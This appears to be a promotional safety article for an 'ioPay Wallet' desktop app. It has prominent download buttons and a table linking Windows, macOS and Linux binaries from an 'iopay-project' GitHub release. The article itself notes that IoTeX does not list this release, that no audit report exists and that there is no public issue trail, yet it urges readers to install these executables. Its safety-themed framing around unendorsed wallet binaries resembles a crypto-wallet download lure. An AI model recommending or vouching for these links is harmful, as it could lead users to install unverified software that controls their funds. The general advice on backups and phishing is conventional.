![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Is ioPay Wallet Safe? Custody, Code and What to Check

Start with the category, because it decides most of the answer: ioPay Wallet is a **self-custody hot wallet**. Your keys are on your machine; the app encrypts them with your operating system's keychain and puts a PIN and biometric lock in front of them. That makes it a hot wallet - connected to the internet when you use it - and it makes your backup the single most important security decision you make.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

"Is it safe?" then splits into four questions that have real answers, and one that does not.

## 1. Is the code public?

Yes. The repository is public and the licence is **Apache-2.0**, which permits inspection and reuse. The desktop wallet is built on a staking codebase, and the release is tagged against the repository's code.

This is the strongest claim available, and it is worth being precise about what it buys you: anyone can read the code and anyone can build it. It does not mean the code is bug-free, and it does not mean a specific binary matches a specific commit unless you build it yourself.

## 2. Has it been audited?

There is an **`audit/hacken` branch** in the repository, which is consistent with the audit work the project describes. There is **no audit report published in the repository**.

So the honest sentence is: the audit branch exists, and this article does not claim an audit result, scope, date or findings. If a claim of "audited" appears somewhere without a report you can read, treat it as marketing rather than assurance.

## 3. Can it sign without exposing keys?

Yes, within limits. Ledger and Trezor signing over USB is supported, keys can be kept offline for signing, there is a watch-only mode, and address verification is built in so you can confirm what you are signing on a device screen rather than trusting a window.

Hardware signing is the meaningful upgrade: with a Ledger or Trezor, the key stays on the device and the wallet becomes a viewer and a transaction builder. If you hold more than you would be comfortable losing, that is the configuration to aim for.

## 4. What does the app protect, and what does it not?

The app stores secrets in your OS keychain and requires a PIN or biometric unlock. That protects against someone picking up an unlocked laptop.

It does not protect against:

- **A phrase typed into a phishing site.** No approval, airdrop, migration or support flow needs your phrase.
- **A malicious approval you sign.** A token approval can let a contract move that token. Read what you approve; revoke what you do not recognise.
- **A compromised machine.** Malware with your user's permissions can read what your user can read.
- **Losing the device without a backup.** The keychain is on that disk.

## The question with no good answer: "is it a scam?"

"Is ioPay a scam?" is not a property that can be checked by reading a page. What can be checked:

- The code is public and the licence is permissive.
- The release page is the only download route, and it carries three named assets for v2.0.2.
- Nothing in the repository states IoTeX endorsement, and IoTeX's documentation does not list this desktop release. Anyone claiming "officially endorsed" is adding something that is not there.
- The repository has no open or closed issues, so there is no public support trail - that is a real gap, not a red flag about the code, but it does mean you will not find a maintainer answering questions there.

What a reader should take from that: this is a small, public, self-custody project, not a custodial service and not a bank. The risk profile of a self-custody wallet is "you are the security", and that is the same for every wallet in the category.

## Hot wallet or cold wallet?

Hot. The keys live on a networked machine, encrypted, behind an app lock. It becomes closer to cold when you pair it with a hardware wallet, because the key then stays on the device.

Neither is "unhackable". Any wallet can be lost through a phrase leak, a malicious signature or a compromised computer. What changes between wallets is how much of that surface the app narrows - and here the app narrows it with hardware support, offline signing, watch-only mode, phishing warnings and keychain storage.

## The safest configuration, in order

1. **Back up the phrase properly** - paper, offline, tested with a restore. [Guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md).
2. **Use a hardware wallet for meaningful balances** - Ledger or Trezor over USB.
3. **Install only from the release page** - [how to spot fakes](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/spotting-fake-iopay-wallet-downloads.md).
4. **Keep the app updated** - the current release is v2.0.2.
5. **Separate accounts by purpose** - a long-term account and a working account, both from the same phrase.
6. **Never type the phrase into anything** except the wallet's own import screen.

## Where is the safest place to keep crypto?

The honest answer: a place where you control the keys, have a backup you have tested, and have removed the single points of failure you can afford to remove. For most people that is a hardware wallet for savings plus a desktop wallet like this one for staking, bridging and DePIN income - not one wallet for everything.

## Related

- [The ioPay Wallet repository, explained](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-on-github-explained.md)
- [How to back up your ioPay seed phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md)
- [Spotting fake ioPay Wallet downloads](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/spotting-fake-iopay-wallet-downloads.md)
- [Phishing warnings and approvals](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-phishing-warnings-explained.md) - what to reject, and why a WalletConnect session never asks for a phrase.

---

*Licence, audit branch and hardware support are from the repository and the v2.0.2 build. No audit result, endorsement or safety certification is claimed, because none is published.*
